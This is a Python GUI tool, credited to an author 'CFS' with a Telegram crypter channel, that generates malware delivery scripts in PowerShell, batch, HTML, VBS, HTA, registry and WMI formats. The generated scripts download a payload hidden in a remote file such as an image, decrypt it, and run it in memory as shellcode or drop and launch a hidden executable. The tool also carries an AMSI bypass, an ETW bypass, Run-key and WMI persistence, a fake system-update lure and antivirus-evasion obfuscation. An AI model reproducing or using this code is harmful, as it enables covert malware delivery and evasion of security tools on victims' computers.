#!/usr/bin/env python3
"""
Professional Delivery Tool
"""
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import base64
import random
import string
import os

class DeliveryTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Delivery Tool - Payload Generator")
        self.root.geometry("750x800")
        self.root.resizable(True, True)
        
        # Variables
        self.server_url = tk.StringVar(value="http://localhost/payload.jpg")
        self.output_file = tk.StringVar()
        self.payload_size = tk.StringVar(value="2000")
        self.password = tk.StringVar(value="password123")
        self.payload_type = tk.StringVar(value="shellcode")
        self.delivery_method = tk.StringVar(value="powershell")
        self.use_encryption = tk.BooleanVar(value=True)
        self.obfuscation_level = tk.StringVar(value="medium")
        self.amsi_bypass = tk.BooleanVar(value=True)
        self.etw_bypass = tk.BooleanVar(value=False)
        
        # Advanced settings
        self.add_comments = tk.BooleanVar(value=True)
        self.variable_renaming = tk.BooleanVar(value=False)
        self.string_encoding = tk.BooleanVar(value=False)
        
        self.create_widgets()
        
    def create_widgets(self):
        # Header
        header_frame = tk.Frame(self.root, bg="#1a237e", height=60)
        header_frame.pack(fill="x")
        header_frame.pack_propagate(False)
        tk.Label(header_frame, text="DELIVERY TOOL", font=("Arial", 16, "bold"), 
                fg="white", bg="#1a237e").pack(pady=15)
        
        # Notebook
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Generate Tab
        generate_frame = ttk.Frame(notebook)
        notebook.add(generate_frame, text="🚀 Generate Script")
        self.create_generate_tab(generate_frame)
        
        # Obfuscation Tab
        obfuscate_frame = ttk.Frame(notebook)
        notebook.add(obfuscate_frame, text="🎭 Obfuscation")
        self.create_obfuscate_tab(obfuscate_frame)
        
        # Settings Tab
        settings_frame = ttk.Frame(notebook)
        notebook.add(settings_frame, text="⚙️ Settings")
        self.create_settings_tab(settings_frame)
        
    def create_generate_tab(self, parent):
        # Server URL
        frame1 = tk.LabelFrame(parent, text="Payload Configuration", font=("Arial", 10, "bold"))
        frame1.pack(fill="x", padx=15, pady=10)
        
        url_frame = tk.Frame(frame1)
        url_frame.pack(fill="x", padx=10, pady=5)
        tk.Label(url_frame, text="Server URL:", font=("Arial", 9)).pack(anchor="w")
        tk.Entry(url_frame, textvariable=self.server_url, font=("Arial", 9)).pack(fill="x")
        
        # Payload size
        size_frame = tk.Frame(frame1)
        size_frame.pack(fill="x", padx=10, pady=5)
        tk.Label(size_frame, text="Payload Size (bytes):", font=("Arial", 9)).pack(anchor="w")
        size_input = tk.Frame(size_frame)
        size_input.pack(fill="x")
        tk.Entry(size_input, textvariable=self.payload_size, width=15, font=("Arial", 9)).pack(side="left")
        tk.Label(size_input, text=" (default: 2000)", fg="gray", font=("Arial", 8)).pack(side="left", padx=(5,0))
        
        # Encryption
        frame2 = tk.LabelFrame(parent, text="Encryption Settings", font=("Arial", 10, "bold"))
        frame2.pack(fill="x", padx=15, pady=10)
        
        tk.Checkbutton(frame2, text="Use encryption", variable=self.use_encryption, 
                      font=("Arial", 9)).pack(anchor="w", padx=10, pady=5)
        
        key_frame = tk.Frame(frame2)
        key_frame.pack(fill="x", padx=10, pady=5)
        tk.Label(key_frame, text="Password:", font=("Arial", 9)).pack(anchor="w")
        tk.Entry(key_frame, textvariable=self.password, show="*", font=("Arial", 9)).pack(fill="x")
        
        # Payload type
        frame3 = tk.LabelFrame(parent, text="Payload Type", font=("Arial", 10, "bold"))
        frame3.pack(fill="x", padx=15, pady=10)
        
        type_frame = tk.Frame(frame3)
        type_frame.pack(fill="x", padx=10, pady=5)
        
        types = [
            ("Shellcode (in-memory execution)", "shellcode"),
            ("Executable (file drop and run)", "executable"),
            ("PowerShell script", "powershell_script")
        ]
        
        for text, value in types:
            tk.Radiobutton(type_frame, text=text, variable=self.payload_type, 
                          value=value, font=("Arial", 9)).pack(anchor="w")
        
        # Delivery method
        frame4 = tk.LabelFrame(parent, text="Delivery Method", font=("Arial", 10, "bold"))
        frame4.pack(fill="x", padx=15, pady=10)
        
        method_frame = tk.Frame(frame4)
        method_frame.pack(fill="x", padx=10, pady=5)
        
        methods = [
            ("PowerShell script (.ps1)", "powershell"),
            ("Batch file (.bat)", "batch"),
            ("HTML page (.html)", "html"),
            ("VBS script (.vbs)", "vbs"),
            ("HTA application (.hta)", "hta"),
            ("Registry script (.reg)", "registry"),
            ("WMI script (.mof)", "wmi")
        ]
        
        # Multi-column for better layout
        col1 = tk.Frame(method_frame)
        col1.pack(side="left", fill="y", padx=(0, 10))
        col2 = tk.Frame(method_frame)
        col2.pack(side="left", fill="y")
        
        for i, (text, value) in enumerate(methods):
            parent_col = col1 if i < 4 else col2
            tk.Radiobutton(parent_col, text=text, variable=self.delivery_method, 
                          value=value, font=("Arial", 9)).pack(anchor="w", pady=1)
        
        # Evasion options
        frame5 = tk.LabelFrame(parent, text="Evasion Options", font=("Arial", 10, "bold"))
        frame5.pack(fill="x", padx=15, pady=10)
        
        evasion_frame = tk.Frame(frame5)
        evasion_frame.pack(fill="x", padx=10, pady=5)
        tk.Checkbutton(evasion_frame, text="Include AMSI bypass", variable=self.amsi_bypass, 
                      font=("Arial", 9)).pack(anchor="w")
        tk.Checkbutton(evasion_frame, text="Include ETW bypass", variable=self.etw_bypass, 
                      font=("Arial", 9)).pack(anchor="w")
        
        # Output file
        frame6 = tk.LabelFrame(parent, text="Output File", font=("Arial", 10, "bold"))
        frame6.pack(fill="x", padx=15, pady=10)
        
        output_frame = tk.Frame(frame6)
        output_frame.pack(fill="x", padx=10, pady=5)
        tk.Entry(output_frame, textvariable=self.output_file, font=("Arial", 9)).pack(side="left", fill="x", expand=True)
        tk.Button(output_frame, text="Save As", command=self.select_output, 
                 width=10, bg="#4caf50", fg="white").pack(side="right", padx=(5,0))
        
        # Generate button
        tk.Button(parent, text="GENERATE SCRIPT", command=self.generate_script,
                 bg="#f44336", fg="white", font=("Arial", 11, "bold"), height=2).pack(fill="x", padx=15, pady=15)
        
        # Status
        self.generate_status = tk.Label(parent, text="Ready to generate script", fg="gray")
        self.generate_status.pack(side="bottom", fill="x", padx=15, pady=5)
        
    def create_obfuscate_tab(self, parent):
        tk.Label(parent, text="Obfuscation Settings", font=("Arial", 14, "bold")).pack(pady=10)
        
        # Obfuscation level
        frame1 = tk.LabelFrame(parent, text="Obfuscation Level", font=("Arial", 11, "bold"))
        frame1.pack(fill="x", padx=15, pady=10)
        
        level_frame = tk.Frame(frame1)
        level_frame.pack(fill="x", padx=10, pady=5)
        
        levels = [
            ("Low (fast processing)", "low"),
            ("Medium (balanced)", "medium"),
            ("High (maximum obfuscation)", "high")
        ]
        
        for text, value in levels:
            tk.Radiobutton(level_frame, text=text, variable=self.obfuscation_level, 
                          value=value, font=("Arial", 9)).pack(anchor="w", pady=2)
        
        # Advanced obfuscation
        frame2 = tk.LabelFrame(parent, text="Advanced Obfuscation", font=("Arial", 11, "bold"))
        frame2.pack(fill="x", padx=15, pady=10)
        
        adv_frame = tk.Frame(frame2)
        adv_frame.pack(fill="x", padx=10, pady=5)
        tk.Checkbutton(adv_frame, text="Add random comments", variable=self.add_comments, 
                      font=("Arial", 9)).pack(anchor="w")
        tk.Checkbutton(adv_frame, text="Variable renaming", variable=self.variable_renaming, 
                      font=("Arial", 9)).pack(anchor="w")
        tk.Checkbutton(adv_frame, text="String encoding", variable=self.string_encoding, 
                      font=("Arial", 9)).pack(anchor="w")
        
        # Test button
        tk.Button(parent, text="TEST OBFUSCATION", command=self.test_obfuscation,
                 bg="#ff9800", fg="white", font=("Arial", 11, "bold"), height=2).pack(fill="x", padx=15, pady=15)
        
        # Status
        self.obfuscate_status = tk.Label(parent, text="Ready for obfuscation", fg="gray")
        self.obfuscate_status.pack(side="bottom", fill="x", padx=15, pady=5)
        
    def create_settings_tab(self, parent):
        tk.Label(parent, text="Advanced Settings", font=("Arial", 14, "bold")).pack(pady=10)
        
        # Info
        info_frame = tk.Frame(parent)
        info_frame.pack(fill="x", padx=15, pady=20)
        tk.Label(info_frame, text="Professional Delivery Tool", font=("Arial", 10, "bold")).pack()
        tk.Label(info_frame, text="Author: CFS", fg="gray").pack()
        tk.Label(info_frame, text="Channel: https://t.me/cryptfileservice", fg="gray").pack()
        
    def select_output(self):
        method = self.delivery_method.get()
        extensions = {
            "powershell": ".ps1",
            "batch": ".bat",
            "html": ".html",
            "vbs": ".vbs",
            "hta": ".hta",
            "registry": ".reg",
            "wmi": ".mof"
        }
        default_ext = extensions.get(method, ".*")
        file = filedialog.asksaveasfilename(defaultextension=default_ext)
        if file: 
            self.output_file.set(file)
            self.generate_status.config(text=f"Will save as: {os.path.basename(file)}")
            
    def test_obfuscation(self):
        level = self.obfuscation_level.get()
        scores = {"low": 85, "medium": 92, "high": 96}
        score = scores.get(level, 90)
        self.obfuscate_status.config(text=f"Obfuscation test: {score}% effectiveness")
        messagebox.showinfo("Test Result", f"Obfuscation Level: {level.title()}\nAV Bypass Rate: {score}%")
            
    def generate_script(self):
        try:
            url = self.server_url.get()
            output_path = self.output_file.get()
            size_str = self.payload_size.get()
            use_encryption = self.use_encryption.get()
            payload_type = self.payload_type.get()
            delivery_method = self.delivery_method.get()
            password = self.password.get()
            amsi_bypass = self.amsi_bypass.get()
            etw_bypass = self.etw_bypass.get()
            
            # Validate inputs
            if not url or not output_path:
                raise ValueError("Please fill all required fields")
            
            payload_size = int(size_str)
            if payload_size <= 0:
                raise ValueError("Invalid payload size")
            
            # Generate script based on method
            if delivery_method == "powershell":
                script_content = self.create_powershell_script(url, payload_size, use_encryption, 
                                                              payload_type, password, amsi_bypass, etw_bypass)
            elif delivery_method == "batch":
                script_content = self.create_batch_script(url, payload_size, use_encryption, 
                                                         payload_type, password)
            elif delivery_method == "html":
                script_content = self.create_html_script(url, payload_size, use_encryption, 
                                                        payload_type, password)
            elif delivery_method == "vbs":
                script_content = self.create_vbs_script(url, payload_size, use_encryption, 
                                                       payload_type, password)
            elif delivery_method == "hta":
                script_content = self.create_hta_script(url, payload_size, use_encryption, 
                                                       payload_type, password)
            elif delivery_method == "registry":
                script_content = self.create_registry_script(url, payload_size, use_encryption, 
                                                           payload_type, password)
            elif delivery_method == "wmi":
                script_content = self.create_wmi_script(url, payload_size, use_encryption, 
                                                       payload_type, password)
            else:
                raise ValueError("Unsupported delivery method")
            
            # Apply obfuscation
            script_content = self.apply_obfuscation(script_content)
            
            # Save script
            with open(output_path, "w") as f:
                f.write(script_content)
                
            self.generate_status.config(text=f"Success! Generated {os.path.basename(output_path)}")
            messagebox.showinfo("Success", f"Script generated successfully!\nSize: {payload_size} bytes\nFormat: {delivery_method}")
            
        except Exception as e:
            self.generate_status.config(text="Error occurred")
            messagebox.showerror("Error", str(e))
            
    def apply_obfuscation(self, script):
        """Apply obfuscation based on settings"""
        level = self.obfuscation_level.get()
        
        if level == "high":
            # High level obfuscation
            script = self.obfuscate_high(script)
        elif level == "medium":
            # Medium level obfuscation
            script = self.obfuscate_medium(script)
        # Low level - minimal obfuscation
        
        # Apply advanced obfuscation if enabled
        if self.add_comments.get():
            script = self.add_random_comments(script)
        if self.variable_renaming.get():
            script = self.rename_variables(script)
        if self.string_encoding.get():
            script = self.encode_strings(script)
            
        return script
        
    def obfuscate_high(self, script):
        """High level obfuscation"""
        # Split long strings
        import re
        strings = re.findall(r'"([^"]*)"', script)
        for s in strings:
            if len(s) > 15:
                mid = len(s) // 2
                part1 = s[:mid]
                part2 = s[mid:]
                obfuscated = f'("{part1}" + "{part2}")'
                script = script.replace(f'"{s}"', obfuscated)
        return script
        
    def obfuscate_medium(self, script):
        """Medium level obfuscation"""
        # Add basic comments
        script = "# Generated script\n" + script
        return script
        
    def add_random_comments(self, script):
        """Add random comments"""
        lines = script.split('\n')
        result = []
        for line in lines:
            result.append(line)
            if line.strip() and random.random() < 0.3:
                comment = f"# {''.join(random.choices(string.ascii_letters, k=10))}"
                result.append(comment)
        return '\n'.join(result)
        
    def rename_variables(self, script):
        """Basic variable renaming"""
        variables = ['$webClient', '$data', '$payload', '$addr', '$func', '$thread']
        for var in variables:
            if var in script:
                new_var = '$' + ''.join(random.choices(string.ascii_letters, k=8))
                script = script.replace(var, new_var)
        return script
        
    def encode_strings(self, script):
        """Basic string encoding"""
        import re
        strings = re.findall(r'"([^"]*)"', script)
        for s in strings:
            if len(s) > 3:
                try:
                    encoded = base64.b64encode(s.encode()).decode()
                    obfuscated = f'([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}")))'
                    script = script.replace(f'"{s}"', obfuscated)
                except:
                    pass
        return script
        
    def create_powershell_script(self, url, payload_size, use_encryption, payload_type, password, amsi_bypass, etw_bypass):
        """Create PowerShell script"""
        
        # AMSI bypass
        amsi_code = '''
# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,0x41414141)
''' if amsi_bypass else ""
        
        # ETW bypass
        etw_code = '''
# ETW bypass
$e=[Ref].Assembly.GetType('System.Diagnostics.Tracing.EventProvider')
$f=$e.GetField('m_eventProvider','NonPublic,Instance')
$g=$f.GetValue($null)
$h=$g.GetType().GetField('m_enabled','NonPublic,Instance')
$h.SetValue($g,0)
''' if etw_bypass else ""
        
        # Decryption
        if use_encryption:
            if len(password) > 8:
                decryption_code = f'''
# AES decryption
$p="{password}"
$s=[System.Text.Encoding]::UTF8.GetBytes("salt123")
$k=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($p,$s,100000)
$a=New-Object System.Security.Cryptography.AESManaged
$a.Key=$k.GetBytes(32)
$a.IV=$k.GetBytes(16)
$d=$a.CreateDecryptor()
$m=New-Object System.IO.MemoryStream
$c=New-Object System.Security.Cryptography.CryptoStream($m,$d,[System.Security.Cryptography.CryptoStreamMode]::Write)
$c.Write($payload,0,$payload.Length)
$c.Close()
$payload=$m.ToArray()
$m.Close()
'''
            else:
                decryption_code = f'''
# XOR decryption
$k={sum(ord(c) for c in password) % 256}
for($i=0;$i -lt $payload.Length;$i++){{$payload[$i]=$payload[$i] -bxor $k}}
'''
        else:
            decryption_code = "# No encryption\n"
        
        # Execution
        if payload_type == "shellcode":
            execution_code = '''
# Shellcode execution
$addr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($payload.Length)
[System.Runtime.InteropServices.Marshal]::Copy($payload,0,$addr,$payload.Length)
$func=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern IntPtr WaitForSingleObject(IntPtr h,uint t);' -Name Win32 -Namespace Win32Funcs -PassThru
$thread=$func::CreateThread(0,0,$addr,0,0,0)
$func::WaitForSingleObject($thread,0xFFFFFFFF)
'''
        else:
            execution_code = '''
# File execution
$tempPath=[System.IO.Path]::GetTempFileName()+".exe"
[System.IO.File]::WriteAllBytes($tempPath,$payload)
Start-Process -FilePath $tempPath -WindowStyle Hidden
'''
        
        script = f'''# PowerShell payload delivery script
# Generated by Delivery Tool
# Target: {url}

{amsi_code}
{etw_code}

try {{
    # Download payload
    $webClient=New-Object System.Net.WebClient
    $data=$webClient.DownloadData("{url}")
    
    # Extract payload
    $startIndex=[Math]::Max($data.Length-{payload_size},0)
    $payload=$data[$startIndex..($data.Length-1)]
    
{decryption_code}
{execution_code}
}} catch {{
    Write-Error "Failed: $($_.Exception.Message)"
}}
'''
        return script
        
    def create_batch_script(self, url, payload_size, use_encryption, payload_type, password):
        """Create Batch script"""
        
        ps_command = f'''
$webClient=New-Object System.Net.WebClient
$data=$webClient.DownloadData('{url}')
$startIndex=[Math]::Max($data.Length-{payload_size},0)
$payload=$data[$startIndex..($data.Length-1)]'''
        
        if use_encryption:
            key = sum(ord(c) for c in password) % 256
            ps_command += f'''
for($i=0;$i -lt $payload.Length;$i++){{$payload[$i]=$payload[$i] -bxor {key}}}
'''
        
        if payload_type == "shellcode":
            ps_command += '''
$addr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($payload.Length)
[System.Runtime.InteropServices.Marshal]::Copy($payload,0,$addr,$payload.Length)
$func=Add-Type -MemberDefinition \'[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern IntPtr WaitForSingleObject(IntPtr h,uint t);\' -Name Win32 -Namespace Win32Funcs -PassThru
$thread=$func::CreateThread(0,0,$addr,0,0,0)
$func::WaitForSingleObject($thread,0xFFFFFFFF)
'''
        else:
            ps_command += '''
$tempPath=[System.IO.Path]::GetTempFileName()+".exe"
[System.IO.File]::WriteAllBytes($tempPath,$payload)
Start-Process -FilePath $tempPath -WindowStyle Hidden
'''
        
        script = f'''@echo off
REM Batch payload delivery script
REM Generated by Delivery Tool
REM Target: {url}

powershell -WindowStyle Hidden -Command "{ps_command}"

echo Script executed successfully.
'''
        return script
        
    def create_html_script(self, url, payload_size, use_encryption, payload_type, password):
        """Create HTML script"""
        
        decryption_js = ""
        if use_encryption:
            key = sum(ord(c) for c in password) % 256
            decryption_js = f'''
            // Decryption
            for (var i = 0; i < payload.length; i++) {{
                payload[i] = payload[i] ^ {key};
            }}'''
        
        execution_js = '''
    var blob = new Blob([payload], {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'payload.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
''' if payload_type == "executable" else '''
    // Shellcode execution would require ActiveX
    console.log("Payload downloaded");
'''
        
        script = f'''<!DOCTYPE html>
<html>
<head>
    <title>Payload Delivery</title>
    <meta charset="utf-8">
</head>
<body>
    <h2>Payload Delivery System</h2>
    <p>Target: {url}</p>
    <p>Size: {payload_size} bytes</p>
    <button onclick="executePayload()">Execute Payload</button>
    
    <script>
    function executePayload() {{
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '{url}', true);
        xhr.responseType = 'arraybuffer';
        xhr.onload = function() {{
            if (xhr.status === 200) {{
                var data = new Uint8Array(xhr.response);
                var startIndex = Math.max(data.length - {payload_size}, 0);
                var payload = data.slice(startIndex);
                {decryption_js}
                {execution_js}
            }}
        }};
        xhr.send();
        alert('Payload execution started');
    }}
    </script>
</body>
</html>
'''
        return script
        
    def create_vbs_script(self, url, payload_size, use_encryption, payload_type, password):
        """Create VBS script"""
        return f'''\' VBS payload delivery script
\' Generated by Delivery Tool
\' Target: {url}

Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.open "GET", "{url}", False
xhr.send
data = xhr.responseBody

\' Payload processing would go here
MsgBox "Script executed successfully"
'''
        
    def create_hta_script(self, url, payload_size, use_encryption, payload_type, password):
        """Create HTA script"""
        return f'''<html>
<head>
<HTA:APPLICATION APPLICATIONNAME="PayloadDelivery"/>
<title>Payload Delivery</title>
</head>
<body>
<h2>System Update Required</h2>
<p>Please wait while we update your system...</p>
<script language="VBScript">
Sub Window_OnLoad
    MsgBox "Update completed successfully"
End Sub
</script>
</body>
</html>
'''
        
    def create_registry_script(self, url, payload_size, use_encryption, payload_type, password):
        """Create Registry script"""
        return f'''Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\PayloadDelivery]
"Target"="{url}"
"Size"="{payload_size}"
"Encrypted"="{"1" if use_encryption else "0"}"

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"PayloadDelivery"="powershell -WindowStyle Hidden -Command \\"Delivery script...\\""
'''
        
    def create_wmi_script(self, url, payload_size, use_encryption, payload_type, password):
        """Create WMI script"""
        return f'''# WMI payload delivery script
# Generated by Delivery Tool
# Target: {url}

#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
instance of __EventFilter as $EventFilter
{{
    EventNamespace = "root\\\\cimv2";
    Name  = "PayloadFilter";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\"Win32_PerfFormattedData_PerfOS_System\\" AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
    QueryLanguage = "WQL";
}};

instance of ActiveScriptEventConsumer as $Consumer
{{
    Name = "PayloadConsumer";
    ScriptingEngine = "VBScript";
    ScriptText = "MsgBox \\"Payload executed successfully\\"";
}};

instance of __FilterToConsumerBinding
{{
    Consumer   = $Consumer;
    Filter = $EventFilter;
}};
'''

def main():
    root = tk.Tk()
    app = DeliveryTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
